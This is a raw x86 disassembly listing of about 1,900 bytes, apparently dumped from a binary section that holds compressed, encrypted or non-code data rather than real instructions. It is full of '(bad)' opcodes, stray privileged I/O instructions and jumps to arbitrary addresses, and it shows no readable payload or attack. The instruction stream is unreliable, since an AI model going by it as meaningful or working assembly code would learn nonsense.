  420b2a:	sub    DWORD PTR [eax+ecx*2+0x1e4dd983],esp
  420b31:	call   0x5e7e2c8b
  420b36:	pushf  
  420b37:	xor    eax,0x4ae7cb3
  420b3c:	or     al,ch
  420b3e:	and    ebp,ecx
  420b40:	cwde   
  420b41:	cmp    al,BYTE PTR [ebx+0x59c56b63]
  420b47:	call   0xdb35:0x8193810
  420b4e:	dec    ecx
  420b4f:	push   0xa2177602
  420b54:	jae    0x420b56
  420b56:	jno    0x420b3a
  420b58:	pop    ebx
  420b59:	aad    0x4f
  420b5b:	cdq    
  420b5c:	mov    esp,0xf2c8a27e
  420b61:	pop    edx
  420b62:	or     esp,edi
  420b64:	and    BYTE PTR [ecx],ah
  420b66:	mov    dl,0x10
  420b68:	dec    esi
  420b69:	add    al,0x5c
  420b6b:	jno    0x420b31
  420b6d:	mov    dl,0x59
  420b6f:	daa    
  420b70:	add    ebx,DWORD PTR [ebp-0x313810a]
  420b76:	and    esp,DWORD PTR [ebx+0x14]
  420b79:	mov    BYTE PTR [ebp+0x32],bl
  420b7c:	sbb    DWORD PTR [esi+0x1],ebp
  420b7f:	pop    ecx
  420b80:	mov    ah,0x4d
  420b82:	pop    ebp
  420b83:	jmp    0x17baa0fa
  420b88:	pushf  
  420b89:	dec    ebp
  420b8a:	mov    edi,0xc6ce2a10
  420b8f:	rcr    BYTE PTR [eax+0x28824330],cl
  420b95:	stos   DWORD PTR es:[edi],eax
  420b96:	jmp    0x305066c7
  420b9b:	push   eax
  420b9c:	fistp  QWORD PTR [esi+0x3fd7ec10]
  420ba2:	cmp    eax,0xc1a33243
  420ba7:	es into 
  420ba9:	jg     0x420c1d
  420bab:	retf   0xde1f
  420bae:	jmp    0x420b9f
  420bb0:	into   
  420bb1:	xchg   DWORD PTR [eax-0x69b21f8a],edi
  420bb7:	cmp    eax,0x488778ef
  420bbc:	xchg   edi,eax
  420bbd:	pop    ds
  420bbe:	xor    BYTE PTR [esi],bl
  420bc0:	pushf  
  420bc1:	fst    QWORD PTR [edi+eax*2+0x1f78b0f7]
  420bc8:	sahf   
  420bc9:	mov    edi,0x52768fac
  420bce:	pop    ecx
  420bcf:	sbb    ebx,DWORD PTR [edx+0x24]
  420bd2:	rcl    BYTE PTR [edi+0x57],0x91
  420bd6:	pop    DWORD PTR [eax-0x288267a8]
  420bdc:	mov    esp,0xdcb7a6ce
  420be1:	ror    DWORD PTR [eax+0x35fa40ae],cl
  420be7:	rol    BYTE PTR [edi-0x47],1
  420bea:	mov    al,0x35
  420bec:	jne    0x420bd4
  420bee:	dec    edx
  420bef:	gs mov ch,0x3e
  420bf2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420bf3:	inc    edi
  420bf4:	mov    eax,0xd27b235a
  420bf9:	mov    edi,esi
  420bfb:	pop    ss
  420bfc:	xor    dh,BYTE PTR [eax-0x2c9bcffe]
  420c02:	pop    ecx
  420c03:	fdiv   QWORD PTR [ebp-0x4c]
  420c06:	ror    BYTE PTR [ebp-0x53],cl
  420c09:	jmp    0xd80a:0xb4621401
  420c10:	mov    ecx,0xb87f4980
  420c15:	(bad)  
  420c16:	fiadd  DWORD PTR [edx-0x5d]
  420c19:	sti    
  420c1a:	leave  
  420c1b:	pop    edi
  420c1c:	add    esp,esi
  420c1e:	stos   BYTE PTR es:[edi],al
  420c1f:	pop    edi
  420c20:	mov    edi,0x7fff75fb
  420c25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420c26:	imul   esp,DWORD PTR [esi-0x61],0xffffffe3
  420c2a:	mov    ds:0xf64f3988,eax
  420c2f:	in     eax,0x94
  420c31:	je     0x420c8a
  420c33:	jno    0x420c1f
  420c35:	cli    
  420c36:	inc    edx
  420c37:	popa   
  420c38:	fbstp  TBYTE PTR [edi-0x78]
  420c3b:	(bad)  
  420c3c:	mov    ebx,0x6d510a2f
  420c41:	sahf   
  420c42:	es push eax
  420c44:	add    eax,0xb173ba56
  420c49:	into   
  420c4a:	pushf  
  420c4b:	ds pop eax
  420c4d:	scas   eax,DWORD PTR es:[edi]
  420c4e:	imul   esi,DWORD PTR [eax+0x6b5f6846],0x719c447b
  420c58:	mov    WORD PTR ss:[esi],fs
  420c5b:	dec    esi
  420c5c:	lock std 
  420c5e:	imul   edx,DWORD PTR [edi-0x69b66e55],0xcb60f005
  420c68:	pop    ebx
  420c69:	into   
  420c6a:	xchg   ebx,eax
  420c6b:	cmp    dh,BYTE PTR [ecx]
  420c6d:	xchg   BYTE PTR [edi+eax*2],dl
  420c70:	aaa    
  420c71:	jno    0x420c64
  420c73:	dec    ebp
  420c74:	(bad)  
  420c75:	ficomp WORD PTR [ecx-0x7d]
  420c78:	xchg   DWORD PTR [edi+0x626d7011],ecx
  420c7e:	or     eax,0x6df34761
  420c83:	xchg   esi,edi
  420c85:	aam    0xb6
  420c87:	imul   DWORD PTR [esi]
  420c89:	jo     0x420c66
  420c8b:	push   ds
  420c8c:	pusha  
  420c8d:	jg     0x420c94
  420c8f:	test   BYTE PTR [edx-0x16617a48],al
  420c95:	jns    0x420d15
  420c97:	psrad  mm0,mm3
  420c9a:	push   cs
  420c9b:	xor    ebp,DWORD PTR [esi]
  420c9d:	mov    esp,0x83835fe4
  420ca2:	adc    dl,BYTE PTR [ecx]
  420ca4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420ca5:	jae    0x420c29
  420ca7:	xchg   esi,eax
  420ca8:	xchg   ecx,eax
  420ca9:	xor    ecx,DWORD PTR [edx]
  420cab:	jmp    0x6866:0x125913e8
  420cb2:	push   esp
  420cb3:	jge    0x420c4c
  420cb5:	outs   dx,BYTE PTR ds:[esi]
  420cb6:	scas   eax,DWORD PTR es:[edi]
  420cb7:	or     cl,bh
  420cb9:	dec    esi
  420cba:	or     edi,DWORD PTR [edx-0xe]
  420cbd:	xor    al,0xec
  420cbf:	inc    BYTE PTR [eax-0x597cfa55]
  420cc5:	dec    ecx
  420cc6:	adc    al,0xe8
  420cc8:	mov    al,ds:0xa572f66d
  420ccd:	cmc    
  420cce:	fisub  WORD PTR ds:0xf9848a86
  420cd4:	loope  0x420cc3
  420cd6:	in     al,0x95
  420cd8:	(bad)  
  420cd9:	xor    BYTE PTR [edi+ebp*2+0x4c],dh
  420cdd:	sub    eax,0xb5fec215
  420ce2:	ds std 
  420ce4:	pop    eax
  420ce5:	cmp    BYTE PTR [ebp+0xd],dh
  420ce8:	pop    ebp
  420ce9:	loopne 0x420cf2
  420ceb:	in     al,0x54
  420ced:	iret   
  420cee:	mov    ecx,0x9fe76a67
  420cf3:	aas    
  420cf4:	frstor [edi+0x75]
  420cf7:	sub    ah,BYTE PTR [edx-0x51b2678]
  420cfd:	mov    edx,edi
  420cff:	nop
  420d00:	pop    ss
  420d01:	dec    eax
  420d02:	dec    ebx
  420d03:	test   al,bl
  420d05:	pop    edx
  420d06:	fs dec edx
  420d08:	mov    eax,0xbab81fb2
  420d0d:	xchg   edx,eax
  420d0e:	dec    ebp
  420d0f:	pop    es
  420d10:	iret   
  420d11:	mov    bl,0x6
  420d13:	sub    ch,BYTE PTR [ecx+eiz*2-0x53]
  420d17:	ret    0x1971
  420d1a:	cmp    DWORD PTR [edx-0x2e],esi
  420d1d:	jle    0x420d7d
  420d1f:	sti    
  420d20:	pop    edx
  420d21:	sahf   
  420d22:	pop    esi
  420d23:	ret    0x5a95
  420d26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420d27:	stos   BYTE PTR es:[edi],al
  420d28:	popa   
  420d29:	jle    0x420d43
  420d2b:	mov    BYTE PTR [ebp+0x3a],ah
  420d2e:	mov    ebp,edx
  420d30:	retf   
  420d31:	fadd   DWORD PTR [eax+esi*2]
  420d34:	sbb    esp,esp
  420d36:	shl    cl,cl
  420d38:	mov    eax,0xfddd901a
  420d3d:	xor    al,0x83
  420d3f:	(bad)  
  420d40:	das    
  420d41:	dec    eax
  420d42:	mov    esp,0x83cd59ec
  420d47:	out    dx,eax
  420d48:	repz mov es,WORD PTR [edi+ecx*2+0x4c]
  420d4d:	je     0x420d3a
  420d4f:	mov    ds:0xe4d00344,al
  420d54:	push   edx
  420d55:	mov    al,bh
  420d57:	stos   DWORD PTR es:[edi],eax
  420d58:	sub    ah,dh
  420d5a:	pop    ds
  420d5b:	push   eax
  420d5c:	dec    ebx
  420d5d:	in     eax,dx
  420d5e:	ret    0x8374
  420d61:	iret   
  420d62:	dec    edx
  420d63:	pop    ds
  420d64:	xchg   BYTE PTR [edx-0x7c319c6],bl
  420d6a:	push   0x5714fd6
  420d6f:	sub    eax,0xf9ad3a70
  420d74:	fs xor bh,ah
  420d77:	inc    BYTE PTR [ebp-0x16c9b07a]
  420d7d:	sub    bh,al
  420d7f:	add    eax,0x6f87038b
  420d84:	and    BYTE PTR [eax],0x8b
  420d87:	pop    es
  420d88:	xchg   edx,eax
  420d89:	out    dx,al
  420d8a:	(bad)  
  420d8b:	(bad)  [ebx+0x1d3837e8]
  420d91:	and    al,0x11
  420d93:	fst    DWORD PTR [eax]
  420d95:	int    0x8d
  420d97:	daa    
  420d98:	shl    BYTE PTR [esi],1
  420d9a:	sbb    eax,0x73185166
  420d9f:	cmp    eax,0x6dbe8060
  420da4:	cmp    ch,al
  420da6:	out    0xcd,al
  420da8:	outs   dx,DWORD PTR ds:[esi]
  420da9:	frstor [ebx+0x424abdcd]
  420daf:	pop    ebx
  420db0:	inc    ecx
  420db1:	push   edi
  420db2:	and    ecx,ecx
  420db4:	mov    bl,0x22
  420db6:	rcr    BYTE PTR [ebp-0x5f],1
  420db9:	add    DWORD PTR [edx-0x4cb85c19],esp
  420dbf:	jbe    0x420daf
  420dc1:	push   ecx
  420dc2:	stos   BYTE PTR es:[edi],al
  420dc3:	push   edx
  420dc4:	les    esi,FWORD PTR [eax+0x3e]
  420dc7:	xchg   ecx,eax
  420dc8:	xchg   ecx,eax
  420dc9:	inc    ecx
  420dca:	sar    DWORD PTR [ebp-0x7a],0x80
  420dce:	jnp    0x420e15
  420dd0:	mov    dl,0x68
  420dd2:	ja     0x420dc1
  420dd4:	loop   0x420d60
  420dd6:	push   ebp
  420dd7:	das    
  420dd8:	(bad)  
  420dd9:	cld    
  420dda:	xchg   edx,eax
  420ddb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420ddc:	pop    es
  420ddd:	mov    eax,0xc882f9e9
  420de2:	inc    esi
  420de3:	icebp  
  420de4:	sub    al,0x96
  420de6:	loop   0x420d75
  420de8:	(bad)  
  420de9:	pop    ds
  420dea:	loope  0x420dbd
  420dec:	mov    dl,0x2d
  420dee:	inc    esi
  420def:	mov    esp,esi
  420df1:	and    ah,bh
  420df3:	rcr    al,cl
  420df5:	sub    eax,0x657021f1
  420dfa:	rol    edx,cl
  420dfc:	xchg   ecx,eax
  420dfd:	push   ebp
  420dfe:	adc    dh,BYTE PTR [edi+0x73]
  420e01:	dec    edx
  420e02:	pop    ebx
  420e03:	dec    eax
  420e04:	or     eax,0x5d3ab25a
  420e09:	ss push ds
  420e0b:	xor    cl,al
  420e0d:	push   cs
  420e0e:	dec    eax
  420e0f:	dec    ebx
  420e10:	arpl   WORD PTR [edi+edi*1],bx
  420e13:	imul   ecx,DWORD PTR [ebp-0x14],0x12
  420e17:	jp     0x420e3c
  420e19:	sti    
  420e1a:	mov    ?,WORD PTR [esi]
  420e1c:	inc    edx
  420e1d:	and    edi,ebx
  420e1f:	xor    BYTE PTR [ecx+eax*1+0x1d],bh
  420e23:	jmp    0x420dc9
  420e25:	sub    dl,al
  420e27:	jle    0x420df9
  420e29:	hlt    
  420e2a:	pop    esi
  420e2b:	pop    esi
  420e2c:	enter  0x32bf,0x7
  420e30:	and    eax,0x7f8ffadd
  420e35:	adc    eax,0x6cdb1538
  420e3a:	or     DWORD PTR [ecx],ecx
  420e3c:	xchg   esp,eax
  420e3d:	icebp  
  420e3e:	mov    ds:0xce791887,eax
  420e43:	jecxz  0x420dfe
  420e45:	mov    bl,0xda
  420e47:	mov    dl,BYTE PTR [edx]
  420e49:	lods   eax,DWORD PTR ds:[esi]
  420e4a:	sub    bh,ch
  420e4c:	rcl    bh,1
  420e4e:	xlat   BYTE PTR ds:[ebx]
  420e4f:	and    BYTE PTR [ebx-0x35535de1],bh
  420e55:	xchg   esp,eax
  420e56:	out    dx,eax
  420e57:	jl     0x420e79
  420e59:	inc    edi
  420e5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420e5b:	and    eax,0x530edb44
  420e60:	pop    es
  420e61:	push   es
  420e62:	sbb    ch,BYTE PTR [esi]
  420e64:	mov    fs,WORD PTR [esi-0x881fa50]
  420e6a:	sbb    al,0xa1
  420e6c:	pusha  
  420e6d:	rcr    dl,cl
  420e6f:	fs mov dh,0x41
  420e72:	cmp    BYTE PTR [bx+si+0x443b],0x28
  420e78:	nop
  420e79:	jle    0x420e0e
  420e7b:	jg     0x420e3e
  420e7d:	mov    esp,0x9bf1a626
  420e82:	outs   dx,BYTE PTR ds:[esi]
  420e83:	adc    BYTE PTR [ebx-0x2e],dl
  420e86:	mov    ds:0x6e08a121,eax
  420e8b:	fs mov bh,0x68
  420e8e:	test   al,0x2b
  420e90:	inc    ebx
  420e91:	push   cs
  420e92:	repnz sub BYTE PTR [edi-0x4c],dh
  420e96:	imul   ebx,DWORD PTR [edi+0x36],0xf4134225
  420e9d:	add    BYTE PTR fs:[edi],0x4e
  420ea1:	loop   0x420f15
  420ea3:	loop   0x420eb4
  420ea5:	repz int3 
  420ea7:	jmp    0x6e321ef8
  420eac:	inc    ecx
  420ead:	lock and BYTE PTR [ebp+0x7717105a],0x13
  420eb5:	ret    
  420eb6:	cld    
  420eb7:	loope  0x420ef7
  420eb9:	sub    eax,esi
  420ebb:	jb     0x420e87
  420ebd:	inc    ecx
  420ebe:	mov    cl,0x8b
  420ec0:	fistp  QWORD PTR [ebp+0x2a]
  420ec3:	add    BYTE PTR [esp+eax*4+0x3c],al
  420ec7:	xchg   ecx,eax
  420ec8:	loop   0x420f20
  420eca:	aam    0x9d
  420ecc:	mov    WORD PTR [edi-0x77b4b097],gs
  420ed2:	out    0xef,eax
  420ed4:	sar    BYTE PTR [eax-0xb9c551c],1
  420eda:	je     0x420e66
  420edc:	xchg   edi,eax
  420edd:	fwait
  420ede:	ins    BYTE PTR es:[edi],dx
  420edf:	xor    esp,ebp
  420ee1:	scas   eax,DWORD PTR es:[edi]
  420ee2:	add    al,bh
  420ee4:	lds    eax,FWORD PTR [ecx]
  420ee6:	in     eax,0x89
  420ee8:	shl    DWORD PTR [esp+eax*4+0x2382dee1],1
  420eef:	or     bh,BYTE PTR es:[edi-0x71]
  420ef3:	ret    0x70d5
  420ef6:	test   al,0x8d
  420ef8:	ret    
  420ef9:	cmp    DWORD PTR [edi-0x42392c2],0xffffffd5
  420f00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420f01:	jns    0x420efd
  420f03:	sbb    ecx,DWORD PTR [ebx]
  420f05:	pop    ebx
  420f06:	popa   
  420f07:	or     ebx,DWORD PTR [eax-0x55]
  420f0a:	cmp    BYTE PTR [ebx+0x566795dc],ah
  420f10:	and    dl,BYTE PTR [eax]
  420f12:	push   eax
  420f13:	lock ret 0xc556
  420f17:	add    eax,0xe10528c0
  420f1c:	adc    DWORD PTR [eax+0x4504e96],eax
  420f22:	push   ds
  420f23:	xor    BYTE PTR [edx-0x389de3dd],cl
  420f29:	nop
  420f2a:	mov    eax,0x53ba7a68
  420f2f:	or     eax,DWORD PTR cs:[eax-0x5a5fe705]
  420f36:	loopne 0x420eec
  420f38:	xchg   edi,eax
  420f39:	cwde   
  420f3a:	loopne 0x420f87
  420f3c:	jg     0x420f4f
  420f3e:	and    BYTE PTR [esi+0x1f],ah
  420f41:	pop    ss
  420f42:	pop    ebp
  420f43:	adc    ecx,edi
  420f45:	fs out dx,eax
  420f47:	jns    0x420f27
  420f49:	lock les eax,FWORD PTR [eax+0x25e21833]
  420f50:	xchg   ecx,eax
  420f51:	fnstenv [edi+0x13]
  420f54:	adc    eax,ebp
  420f56:	ret    0x147c
  420f59:	lahf   
  420f5a:	push   cs
  420f5b:	jnp    0x420f1c
  420f5d:	push   ebx
  420f5e:	les    esi,FWORD PTR [esi-0x1f]
  420f61:	mov    edi,0xd499234
  420f66:	into   
  420f67:	(bad)  
  420f68:	fcmovne st,st(4)
  420f6a:	into   
  420f6b:	or     eax,0x261a41ff
  420f70:	push   ecx
  420f71:	rcr    DWORD PTR [eax+0x720d80c9],0x86
  420f78:	pop    ebp
  420f79:	fwait
  420f7a:	xor    eax,0xccde4f88
  420f7f:	out    0x81,al
  420f81:	fiadd  WORD PTR [edx]
  420f83:	(bad)  
  420f84:	scas   eax,DWORD PTR es:[edi]
  420f85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420f86:	dec    esi
  420f87:	(bad)  
  420f88:	jg     0x420f61
  420f8a:	xchg   BYTE PTR [ebp+0x78],bl
  420f8d:	add    ah,BYTE PTR [esi-0x8]
  420f90:	push   edx
  420f91:	xchg   edi,eax
  420f92:	mov    eax,ds:0xd5214021
  420f97:	sbb    edi,eax
  420f99:	jo     0x420f7a
  420f9b:	popa   
  420f9c:	daa    
  420f9d:	pop    ss
  420f9e:	clc    
  420f9f:	pushf  
  420fa0:	repnz in eax,0xee
  420fa3:	mov    esp,0xf6faa98f
  420fa8:	xchg   ecx,eax
  420fa9:	jmp    0xd719c6b3
  420fae:	fbld   TBYTE PTR [edi]
  420fb0:	dec    ecx
  420fb1:	sbb    eax,0x49472540
  420fb6:	imul   edx,DWORD PTR [edx+eiz*2+0x21a06655],0x7d30c9f8
  420fc1:	mov    ecx,0x33e587ba
  420fc6:	lock xchg esp,eax
  420fc8:	xacquire xchg BYTE PTR [edx-0xe],al
  420fcc:	add    BYTE PTR [ecx+edx*1-0x20],bh
  420fd0:	jecxz  0x420f93
  420fd2:	mov    eax,0x8f9af36d
  420fd7:	fwait
  420fd8:	shr    dh,1
  420fda:	inc    edx
  420fdb:	mov    esi,ecx
  420fdd:	push   esp
  420fde:	push   ebx
  420fdf:	in     al,dx
  420fe0:	out    dx,al
  420fe1:	test   BYTE PTR [ecx-0x53],dl
  420fe4:	pop    ss
  420fe5:	test   al,0x14
  420fe7:	xchg   ecx,eax
  420fe8:	xchg   DWORD PTR [eax],ebp
  420fea:	add    bl,cl
  420fec:	xor    DWORD PTR ds:0x844a0174,ecx
  420ff2:	cli    
  420ff3:	xchg   dh,dh
  420ff5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420ff6:	jnp    0x421016
  420ff8:	test   BYTE PTR [ebx+0x33813ff],bh
  420ffe:	retf   
  420fff:	rol    DWORD PTR [ebp-0x4a],1
  421002:	gs leave 
  421004:	pop    ebp
  421005:	int3   
  421006:	popa   
  421007:	mov    WORD PTR [ebx+edx*8-0x1b06bb6a],gs
  42100e:	(bad)  [eax+0x5f2ce892]
  421014:	aaa    
  421015:	dec    edx
  421016:	jbe    0x421094
  421018:	sbb    eax,0x1e641097
  42101d:	dec    esp
  42101e:	ja     0x421030
  421020:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421021:	retf   
  421022:	imul   esp,ebp,0x53
  421025:	ds retf 
  421027:	mov    dl,0x60
  421029:	ret    
  42102a:	sub    ch,al
  42102c:	cwde   
  42102d:	sbb    edi,ecx
  42102f:	or     edx,esp
  421031:	push   esi
  421032:	pop    ebx
  421033:	dec    esp
  421034:	adc    BYTE PTR [eax+edi*1],0xed
  421038:	push   edi
  421039:	jl     0x421045
  42103b:	or     al,0xb9
  42103d:	jbe    0x421066
  42103f:	mov    ebp,0x7145ae0b
  421044:	outs   dx,BYTE PTR ds:[esi]
  421045:	aam    0xfa
  421047:	hlt    
  421048:	mov    ds:0xc061433e,al
  42104d:	enter  0x5a58,0xd3
  421051:	enter  0xe8c8,0xeb
  421055:	cmp    cl,BYTE PTR [edi]
  421057:	add    BYTE PTR [esi],cl
  421059:	mov    esi,edx
  42105b:	push   ebx
  42105c:	out    dx,al
  42105d:	outs   dx,DWORD PTR ds:[esi]
  42105e:	dec    esp
  42105f:	and    ah,BYTE PTR [edi+0x39]
  421062:	es stc 
  421064:	mov    ch,0x19
  421066:	xchg   edx,eax
  421067:	sbb    BYTE PTR [ebp+0x1b],ah
  42106a:	sub    esp,esi
  42106c:	dec    ecx
  42106d:	test   al,0x7f
  42106f:	jnp    0x42108f
  421071:	or     DWORD PTR [eax],esp
  421073:	(bad)  
  421074:	mov    bl,0x27
  421076:	dec    ecx
  421077:	cmp    ebp,DWORD PTR [ebx+edi*1-0x37]
  42107b:	(bad)  
  42107c:	jnp    0x42109a
  42107e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42107f:	(bad)  
  421080:	push   0xffffff8b
  421082:	xlat   BYTE PTR ds:[ebx]
  421083:	sub    dh,bl
  421085:	ret    
  421086:	mov    WORD PTR [edx],?
  421088:	ins    DWORD PTR es:[edi],dx
  421089:	push   esi
  42108a:	test   al,0xef
  42108c:	sahf   
  42108d:	inc    eax
  42108e:	dec    edx
  42108f:	pop    ss
  421090:	outs   dx,DWORD PTR ds:[esi]
  421091:	mov    eax,0xb4ce5636
  421096:	mov    al,0x0
  421098:	mov    bl,0xe9
  42109a:	enter  0xa9af,0xdb
  42109e:	jo     0x4210a2
  4210a0:	neg    BYTE PTR [esi+0x63]
  4210a3:	(bad)  
  4210a4:	jp     0x42104e
  4210a6:	loope  0x42102f
  4210a8:	push   DWORD PTR [ebx]
  4210aa:	pop    ebx
  4210ab:	mov    edi,0xda786c0d
  4210b0:	fcom   QWORD PTR [eax+ebp*1]
  4210b3:	icebp  
  4210b4:	jno    0x4210af
  4210b6:	(bad)  
  4210b7:	loope  0x4210b7
  4210b9:	jecxz  0x421081
  4210bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4210bc:	and    BYTE PTR [edi+ebx*1],bh
  4210bf:	sbb    eax,0xe9b6dac5
  4210c4:	cmp    DWORD PTR [ebx+0x4c],esi
  4210c7:	or     BYTE PTR [edx],bl
  4210c9:	jns    0x4210b2
  4210cb:	js     0x421142
  4210cd:	and    ebp,DWORD PTR ds:0x6614e08a
  4210d3:	int    0x72
  4210d5:	mov    dl,0x91
  4210d7:	and    BYTE PTR [eax+0x2e6c28b4],dl
  4210dd:	into   
  4210de:	dec    edx
  4210df:	push   es
  4210e0:	dec    esp
  4210e1:	je     0x421095
  4210e3:	xchg   esp,eax
  4210e4:	inc    eax
  4210e5:	lahf   
  4210e6:	das    
  4210e7:	dec    edx
  4210e8:	cmp    al,0x3d
  4210ea:	rcl    BYTE PTR [edx-0x40],0x67
  4210ee:	sub    edx,DWORD PTR es:[ebx]
  4210f1:	mov    eax,ds:0x69baff55
  4210f6:	xchg   BYTE PTR [ebx+0x38],bh
  4210f9:	cmp    ch,BYTE PTR [eax+0x55d4d24d]
  4210ff:	test   eax,0x5959d6ef
  421104:	cdq    
  421105:	outs   dx,BYTE PTR ds:[esi]
  421106:	or     bh,BYTE PTR ds:0x56f7b6d0
  42110c:	pushf  
  42110d:	xchg   edi,eax
  42110e:	cmc    
  42110f:	dec    eax
  421110:	adc    al,0x60
  421112:	(bad)  
  421113:	outs   dx,BYTE PTR ds:[esi]
  421114:	or     ebx,DWORD PTR [ebx-0x59dbf96e]
  42111a:	mov    WORD PTR [edx-0x722372ca],gs
  421120:	cmovae eax,DWORD PTR [ecx-0x5279deb1]
  421127:	cmp    BYTE PTR [ecx-0x52464ef],dl
  42112d:	in     eax,0x7e
  42112f:	(bad)  
  421130:	mov    DWORD PTR [ebp+edx*4+0x6f],eax
  421134:	add    cl,BYTE PTR [edx]
  421136:	jp     0x4211ad
  421138:	and    al,0xbf
  42113a:	inc    edi
  42113b:	imul   ebp,DWORD PTR [eax-0x4cd2096a],0xffffff81
  421142:	mov    dh,0x41
  421144:	rdpmc  
  421146:	sub    BYTE PTR [edi-0x668ae200],dl
  42114c:	not    BYTE PTR [ebx]
  42114e:	push   edx
  42114f:	(bad)  
  421150:	xchg   ecx,eax
  421151:	rol    al,0x2f
  421154:	pop    esi
  421155:	mov    WORD PTR [ecx+0x1c],?
  421158:	inc    esi
  421159:	ss jge 0x421188
  42115c:	and    DWORD PTR [edx+0x2e],0xffffffee
  421160:	sub    esp,DWORD PTR ds:0x183e1270
  421166:	ret    
  421167:	or     BYTE PTR [ebx+0x11],0xa7
  42116b:	push   es
  42116c:	pop    ecx
  42116d:	add    edx,edx
  42116f:	ds push 0xf0a3ba8b
  421175:	mov    edx,0xe691f1d2
  42117a:	adc    eax,0x2167872b
  42117f:	jmp    0xed1b:0xd9322c4d
  421186:	xlat   BYTE PTR gs:[ebx]
  421188:	mov    eax,ds:0x746c3d34
  42118d:	stos   BYTE PTR es:[edi],al
  42118e:	xor    esi,DWORD PTR [esi]
  421190:	dec    ecx
  421191:	adc    BYTE PTR [ebp+0x3c9105f5],bl
  421197:	ins    DWORD PTR es:[edi],dx
  421198:	jle    0x421217
  42119a:	adc    eax,0xec1b167e
  42119f:	cmp    al,0xfb
  4211a1:	push   esp
  4211a2:	ror    BYTE PTR [ecx+0x4f7a57b4],cl
  4211a8:	cmp    DWORD PTR [eax-0x22],ebp
  4211ab:	in     al,0xc
  4211ad:	scas   al,BYTE PTR es:[edi]
  4211ae:	dec    ebp
  4211af:	lock ret 0xc676
  4211b3:	pop    esi
  4211b4:	mov    esi,0x439c67d6
  4211b9:	fprem1 
  4211bb:	into   
  4211bc:	pushf  
  4211bd:	int    0xda
  4211bf:	mov    ds:0xdf41508a,al
  4211c4:	mov    ds:0xd2e3cd8c,al
  4211c9:	sbb    al,0xd7
  4211cb:	scas   al,BYTE PTR es:[edi]
  4211cc:	push   cs
  4211cd:	hlt    
  4211ce:	mov    bl,cl
  4211d0:	xchg   edx,eax
  4211d1:	jl     0x4211e5
  4211d3:	inc    ebx
  4211d4:	shr    DWORD PTR [edx-0x712eeb7b],0x19
  4211db:	or     esp,DWORD PTR [eax-0x7c]
  4211de:	leave  
  4211df:	lds    eax,FWORD PTR [ecx]
  4211e1:	mov    ds:0x1510c9ba,al
  4211e6:	cwde   
  4211e7:	push   0x41
  4211e9:	lds    ebx,FWORD PTR [esi]
  4211eb:	fnstcw WORD PTR [eax+0xc6e5481]
  4211f1:	les    ebp,FWORD PTR [edx]
  4211f3:	pop    ss
  4211f4:	(bad)  
  4211f5:	push   esp
  4211f6:	mov    ebp,0x51479549
  4211fb:	scas   eax,DWORD PTR es:[edi]
  4211fc:	mov    ebx,0xe80cd04a
  421201:	cs jle 0x42126c
  421204:	push   edi
  421205:	retf   0xc443
  421208:	xchg   edx,eax
  421209:	adc    eax,0x7fcc9f58
  42120e:	repnz mov esi,0xee168102
  421214:	xchg   esp,eax
  421215:	ja     0x421223
  421217:	adc    eax,0x14adce3e
  42121c:	or     al,0x4e
  42121e:	loope  0x4211cb
  421220:	and    eax,0xe49e9d23
  421225:	test   DWORD PTR [eax+0x5416825f],eax
  42122b:	jle    0x421284
  42122d:	in     al,dx
  42122e:	or     eax,DWORD PTR [esi+0x2d1a6edf]
  421234:	dec    ebp
  421236:	or     al,0x20
  421238:	gs cdq 
  42123a:	loop   0x421280
  42123c:	fcomp  st(6)
  42123e:	pop    esi
  42123f:	(bad)  
  421240:	dec    esi
  421241:	aaa    
  421242:	or     dh,0x75
  421245:	sub    BYTE PTR [ebp+0x27],al
  421248:	pop    esp
  421249:	ror    dl,1
  42124b:	adc    eax,0x68ed409c
  421250:	ret    
  421251:	jmp    0x292bd8c9
  421256:	fldcw  WORD PTR [ecx+0x29]
  421259:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42125a:	ret    
  42125b:	push   cs
  42125c:	and    DWORD PTR [ebp-0x51],0xffffff97
  421260:	jns    0x4211e3
  421262:	sub    eax,0x4cc9bd2e
  421267:	(bad)
  42126b:	fimul  DWORD PTR [esi]
  42126d:	call   0x45dfb5cd
  421272:	mov    bh,0xf3
  421274:	inc    edi
  421275:	aad    0x2e
  421277:	lds    ebx,FWORD PTR [edi]
  421279:	cdq    
  42127a:	call   DWORD PTR [ecx+0x26]
  42127d:	je     0x421271
  42127f:	push   ebx
  421280:	sub    ecx,ebx
  421282:	punpcklwd mm2,mm0
  421285:	sti    
  421286:	call   DWORD PTR [eax]
  421288:	fcomp  QWORD PTR [esi]
  42128a:	jmp    FWORD PTR [esi-0x7ff29ee6]
  421290:	in     eax,0xb2
  421292:	cmp    eax,0xec3f9b98
  421297:	(bad)  
  421298:	js     0x421295
  42129a:	adc    BYTE PTR ds:0x21101a4f,bl
  4212a0:	sub    edi,DWORD PTR [edi]
  4212a2:	cwde   
  4212a3:	push   esi
  4212a4:	stc    
  4212a5:	mov    ds,eax
  4212a7:	cmp    eax,0x3a894e02
  4212ac:	xchg   ebx,eax
  4212ad:	pop    ecx
  4212ae:	(bad)  
  4212af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4212b0:	or     DWORD PTR [edx-0x349a47f5],eax
  4212b6:	push   ebp
  4212b7:	pop    DWORD PTR [edx]
  4212b9:	aaa    
  4212ba:	test   BYTE PTR [esi-0x57],bh
  4212bd:	inc    ebp
  4212be:	xlat   BYTE PTR ds:[ebx]
  4212bf:	jnp    0x421332
  4212c1:	mov    esp,0xcd522046
  4212c6:	mov    ah,0x92
  4212c8:	cdq    
  4212c9:	out    0xe3,al
  4212cb:	jmp    0x7e15:0xe968d4dc
  4212d2:	push   ebx
  4212d3:	and    al,0x8f
  4212d5:	mov    al,ds:0x1be45937
  4212da:	or     al,0xbc
  4212dc:	jg     0x4212ea
